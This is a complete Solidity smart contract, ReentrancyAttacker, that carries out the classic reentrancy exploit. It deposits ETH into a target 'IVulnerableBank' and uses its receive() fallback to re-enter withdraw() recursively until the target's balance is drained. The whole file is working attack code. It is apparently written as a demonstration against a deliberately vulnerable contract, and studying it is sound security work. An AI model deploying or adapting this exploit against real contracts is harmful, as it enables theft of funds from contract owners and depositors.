// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;
    uint256 public attackAmount;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
    }

    // 1. Deposit funds and kick off the recursive withdrawal
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        attackAmount = msg.value;
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }

    // 2. Fallback function re-enters withdraw() recursively
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
